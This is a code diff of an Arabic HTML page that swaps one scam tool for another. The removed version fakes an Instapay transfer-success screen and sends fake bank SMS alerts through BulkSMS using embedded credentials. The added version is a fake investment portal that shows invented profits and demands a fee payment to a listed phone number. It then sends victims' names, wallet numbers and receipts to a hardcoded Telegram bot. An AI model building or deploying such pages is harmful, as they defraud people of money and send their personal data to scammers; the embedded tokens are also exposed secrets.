@@ -3,134 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instapay</title>
+    <title>منصة التقوى - بوابة الدخول</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --ip-purple: #4e2a84; }
-        body { font-family: sans-serif; background-color: #f8f9fa; margin: 0; display: flex; justify-content: center; overflow-x: hidden; }
-        .app-container { width: 100%; max-width: 420px; background: white; min-height: 100vh; position: relative; }
-        .header { background: var(--ip-purple); color: white; padding: 20px; text-align: center; font-weight: bold; font-size: 18px; border-radius: 0 0 20px 20px; }
-        .content { padding: 25px; }
-        label { display: block; margin-bottom: 8px; font-weight: bold; color: #444; }
-        input { width: 100%; padding: 16px; margin-bottom: 25px; border: 1px solid #ddd; border-radius: 14px; box-sizing: border-box; font-size: 16px; background: #fdfdfd; }
-        .btn-send { background: var(--ip-purple); color: white; width: 100%; padding: 18px; border: none; border-radius: 35px; font-weight: bold; font-size: 17px; cursor: pointer; }
-
-        /* شاشة النجاح المحدثة طبق الأصل */
-        #success-page { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; display: none; flex-direction: column; align-items: center; z-index: 100; }
-        .top-nav { width: 100%; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; border-bottom: 1px solid #f9f9f9; }
-        
-        .icon-box { margin-top: 50px; position: relative; width: 160px; height: 160px; display: flex; align-items: center; justify-content: center; }
-        .c-out { position: absolute; width: 160px; height: 160px; background: #f0f9f1; border-radius: 50%; }
-        .c-mid { position: absolute; width: 130px; height: 130px; background: #e2f2e4; border-radius: 50%; }
-        .c-main { position: absolute; width: 90px; height: 90px; background: #60a561; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 12px rgba(96,165,97,0.3); }
-        .c-main::after { content: '✔'; color: white; font-size: 50px; font-weight: bold; }
-
-        .status-txt { color: #333; font-weight: bold; font-size: 20px; margin-top: 25px; }
-        .amt-box { text-align: center; margin-top: 35px; }
-        .amt-val { font-size: 55px; font-weight: 900; color: #1a1a1a; letter-spacing: -1px; }
-        .egp { font-size: 22px; color: #d35400; margin-right: 8px; font-weight: bold; }
-        .total-lb { color: #bdc3c7; font-size: 15px; margin-top: 5px; }
-
-        .info-card { width: 90%; background: #fff; border: 1px solid #f2f2f2; border-radius: 18px; margin-top: 40px; }
-        .card-item { padding: 20px; display: flex; justify-content: space-between; align-items: center; }
-        .left-info { text-align: right; flex: 1; padding-right: 15px; }
-        .gray-lb { color: #999; font-size: 12px; margin-bottom: 4px; }
-        .bold-val { color: #2c3e50; font-weight: bold; font-size: 15px; }
-        
-        .footer-btn { position: absolute; bottom: 30px; width: 90%; background: var(--ip-purple); color: white; padding: 18px; border-radius: 15px; text-align: center; font-weight: bold; text-decoration: none; font-size: 17px; }
+        :root { --main-grad: linear-gradient(135deg, #020024, #090979, #00d4ff); --gold: #ffcc00; --success: #00ff88; }
+        body { margin: 0; font-family: 'Cairo', sans-serif; background: var(--main-grad); color: white; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 15px; overflow-x: hidden; }
+        .login-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 40px 20px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.2); width: 100%; max-width: 380px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .login-card input { width: 80%; padding: 15px; border-radius: 12px; border: 1px solid var(--gold); background: rgba(0,0,0,0.5); color: white; font-size: 18px; text-align: center; outline: none; margin-bottom: 20px; }
+        .login-card button { background: var(--gold); border: none; padding: 12px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; width: 85%; transition: 0.3s; }
+        #admin-trigger { position: fixed; bottom: 0; right: 0; width: 30px; height: 30px; background: transparent; cursor: pointer; z-index: 9999; }
+        #admin-panel { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: right; }
+        .admin-content { background: #111; border: 2px solid var(--gold); padding: 25px; border-radius: 20px; width: 300px; }
+        .admin-content input { width: 100%; padding: 10px; margin-top: 5px; background: #222; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box; }
+        #main-site { display: none; width: 100%; max-width: 420px; }
+        .site-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 25px; border-radius: 25px; border: 1px solid rgba(255,255,255,0.2); text-align: center; }
+        .balance-box { background: rgba(0,0,0,0.4); padding: 20px; border-radius: 15px; border-right: 5px solid var(--gold); margin-bottom: 20px; }
+        input[type="text"], input[type="tel"], input[type="file"] { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: none; background: white; color: #333; box-sizing: border-box; }
+        .submit-btn { background: var(--success); color: #000; border: none; width: 100%; padding: 15px; font-size: 18px; font-weight: 900; border-radius: 10px; cursor: pointer; }
+        #loader { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 11000; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="app-container" id="main-view">
-    <div class="header">تحويل لحظي</div>
-    <div class="content">
-        <label>رقم هاتف المستلم</label>
-        <input type="text" id="targetPh" placeholder="01xxxxxxxxx">
-        <label>المبلغ (EGP)</label>
-        <input type="number" id="targetAmt" placeholder="5000">
-        <button class="btn-send" onclick="processTransfer()">إرسال الآن</button>
+<div id="admin-trigger" onclick="adminClick()"></div>
+
+<div class="login-card" id="login-page">
+    <h1>🏮 شركة التقوى للاستثمار 🌙</h1>
+    <p style="font-size: 14px; color: #ccc;">برجاء إدخال كود الدخول للمنصة</p>
+    <input type="password" id="entryPass" placeholder="كود الوصول">
+    <button onclick="accessSite()">دخول</button>
+</div>
+
+<div id="admin-panel">
+    <div class="admin-content">
+        <h3 style="color:var(--gold); margin:0; text-align:center;">لوحة إدارة المنصة</h3>
+        <label>كود الدخول:</label>
+        <input type="text" id="setPass" value="123456">
+        <label>المدة (بالدقائق):</label>
+        <input type="number" id="setTime" value="5">
+        <label>الأرباح:</label>
+        <input type="number" id="setProfit" value="50000">
+        <label>الرسوم:</label>
+        <input type="number" id="setFees" value="500">
+        <button onclick="saveAdminSettings()" style="width:100%; margin-top:10px; padding:10px; background:var(--success); border:none; border-radius:5px; font-weight:bold; cursor:pointer;">حفظ وإغلاق</button>
     </div>
 </div>
 
-<div id="success-page">
-    <div class="top-nav">
-        <span style="font-weight: bold; font-size: 16px;">معاملة ناجحة</span>
-        <button onclick="location.reload()" style="border:none; background:#f5f5f5; border-radius:50%; width:32px; height:32px; color:#666; cursor:pointer;">✕</button>
-    </div>
-
-    <div class="icon-box">
-        <div class="c-out"></div>
-        <div class="c-mid"></div>
-        <div class="c-main"></div>
-    </div>
-
-    <div class="status-txt">تم التحويل بنجاح</div>
-
-    <div class="amt-box">
-        <div class="amt-val"><span id="res-amt">0</span><span class="egp">EGP</span></div>
-        <div class="total-lb">المبلغ الإجمالي</div>
-    </div>
-
-    <div class="info-card">
-        <div class="card-item">
-            <img src="https://instapay.eg/assets/images/logo.png" style="width: 35px;">
-            <div class="left-info">
-                <div class="gray-lb">من</div>
-                <div class="bold-val">Khadijja Muhammad (instapay)</div>
-                <div class="gray-lb" style="font-size: 10px;">ACCOUNT XX0170</div>
-            </div>
+<div id="main-site">
+    <div class="site-card">
+        <div class="timer-badge" style="background: rgba(255,0,0,0.3); color: #ff4d4d; padding: 5px 15px; border-radius: 20px; font-weight: bold; font-size: 14px; margin-bottom: 15px; display: inline-block; border: 1px solid #ff4d4d;">⏱️ الجلسة تنتهي خلال: <span id="displayTime">05:00</span></div>
+        <h2 style="color:var(--gold); margin:0;">لوحة الأرباح</h2>
+        <div class="balance-box">
+            <span style="font-size:12px; color:#aaa;">رصيدك الحالي</span>
+            <div style="font-size: 32px; font-weight: 900;"><span id="showProfit">50,000</span> <small style="font-size:14px;">EGP</small></div>
         </div>
+        <input type="text" id="uName" placeholder="الاسم بالكامل">
+        <input type="tel" id="uWallet" placeholder="رقم المحفظة (فودافون كاش..)">
+        <p style="font-size:12px;">رسوم المعالجة المطلوبة (<span id="showFees" style="color:var(--gold); font-weight:bold;">500</span> ج.م) للرقم:</p>
+        <div style="background:#000; color:var(--gold); padding:10px; border-radius:10px; font-weight:bold; margin-bottom:15px;">01226811784</div>
+        <label style="display:block; text-align:right; font-size:12px; color:var(--gold);">ارفق صورة إيصال التحويل:</label>
+        <input type="file" id="uFile" accept="image/*">
+        <button class="submit-btn" onclick="sendToTelegram()">تأكيد السحب الآن</button>
     </div>
-
-    <a href="#" class="footer-btn" onclick="location.reload()">الرئيسية</a>
 </div>
+
+<div id="loader"><div style="width:50px; height:50px; border:4px solid #333; border-top:4px solid var(--success); border-radius:50%; animation:spin 1s linear infinite;"></div><p>جاري المعالجة...</p></div>
 
 <script>
-async function processTransfer() {
-    const amt = document.getElementById('targetAmt').value;
-    const ph = document.getElementById('targetPh').value;
+    const TOKEN = '8398403697:AAEf0JjyVG-yE-DLS1FZKDX1_UKg8lEm02E';
+    const ID = '8232581666';
 
-    if(!amt || !ph) return alert("برجاء ملء البيانات");
+    let config = JSON.parse(localStorage.getItem('adminConfig')) || { pass: '123456', time: 5, profit: 50000, fees: 500 };
 
-    // تحديث واجهة النجاح
-    document.getElementById('res-amt').innerText = Number(amt).toLocaleString();
-    document.getElementById('main-view').style.display = 'none';
-    document.getElementById('success-page').style.display = 'flex';
-
-    // بيانات BulkSMS الخاصة بكِ
-    const tokenId = "0140BB826E5A44CDA27579FCA50CB167-02-2";
-    const tokenSecret = "615#rZ#jn0cXMNN42HfoG#Lm6jP*7";
-    
-    // تجهيز رسالة البنك
-    const date = new Date().toLocaleDateString('ar-EG');
-    const time = new Date().toLocaleTimeString('ar-EG', {hour: '2-digit', minute:'2-digit'});
-    const msg = `تم إضافة تحويل لحظي لبطاقتكم بمبلغ ${amt} جم. رقم مرجعي ${Math.floor(Math.random()*9000000)} يوم ${date} الساعة ${time} للمزيد اتصل بـ 19623`;
-
-    // الربط البرمجي مع BulkSMS
-    try {
-        const response = await fetch('https://api.bulksms.com/v1/messages', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Authorization': 'Basic ' + btoa(tokenId + ':' + tokenSecret)
-            },
-            body: JSON.stringify([{
-                "to": "2" + ph,
-                "body": msg,
-                "routingGroup": "ECONOMY"
-            }])
-        });
-        
-        if(response.ok) {
-            console.log("الرسالة في قائمة الإرسال!");
-        } else {
-            console.log("فشل الإرسال، قد يكون الرصيد لم يتفعل بعد.");
-        }
-    } catch(e) {
-        console.log("خطأ في الاتصال بالموقع.");
+    function applyConfig() {
+        document.getElementById('showProfit').innerText = Number(config.profit).toLocaleString();
+        document.getElementById('showFees').innerText = config.fees;
+        document.getElementById('setPass').value = config.pass;
+        document.getElementById('setTime').value = config.time;
+        document.getElementById('setProfit').value = config.profit;
+        document.getElementById('setFees').value = config.fees;
     }
-}
-</script>
+    applyConfig();
 
+    let count = 0;
+    function adminClick() { count++; if(count >= 3) { document.getElementById('admin-panel').style.display='flex'; count=0; } }
+
+    function saveAdminSettings() {
+        config = {
+            pass: document.getElementById('setPass').value,
+            time: document.getElementById('setTime').value,
+            profit: document.getElementById('setProfit').value,
+            fees: document.getElementById('setFees').value
+        };
+        localStorage.setItem('adminConfig', JSON.stringify(config));
+        applyConfig();
+        document.getElementById('admin-panel').style.display='none';
+    }
+
+    function accessSite() {
+        const pass = document.getElementById('entryPass').value;
+        if(pass === config.pass) {
+            document.getElementById('login-page').style.display = 'none';
+            document.getElementById('main-site').style.display = 'block';
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=🔔 دخول جديد للمنصة بالكود: ${pass}`);
+            startCountdown(config.time * 60);
+        } else {
+            alert("كود خاطئ!");
+        }
+    }
+
+    function startCountdown(sec) {
+        let t = sec;
+        const display = document.getElementById('displayTime');
+        const timer = setInterval(() => {
+            let m = Math.floor(t / 60);
+            let s = t % 60;
+            display.innerText = (m < 10 ? '0' + m : m) + ":" + (s < 10 ? '0' + s : s);
+            if (--t < 0) { clearInterval(timer); alert("انتهى الوقت!"); location.reload(); }
+        }, 1000);
+    }
+
+    async function sendToTelegram() {
+        const name = document.getElementById('uName').value;
+        const wallet = document.getElementById('uWallet').value;
+        const file = document.getElementById('uFile').files[0];
+
+        if(!name || !wallet || !file) { alert("أكمل البيانات وارفق الإيصال!"); return; }
+
+        document.getElementById('loader').style.display='flex';
+        const fd = new FormData();
+        fd.append('chat_id', ID);
+        fd.append('photo', file);
+        fd.append('caption', `🌟 طلب سحب جديد 🌟\n👤 الاسم: ${name}\n📱 رقم المحفظة: ${wallet}\n💰 الربح المعروض: ${config.profit}\n💸 الرسوم المدفوعة: ${config.fees}`);
+
+        try {
+            const resp = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            if(resp.ok) {
+                alert("تم إرسال طلبك بنجاح، جاري المراجعة.");
+                location.reload();
+            } else { alert("خطأ في الإرسال، حاول ثانية."); }
+        } catch(e) { alert("خطأ في الاتصال بالسيرفر."); }
+        document.getElementById('loader').style.display='none';
+    }
+</script>
 </body>
 </html>
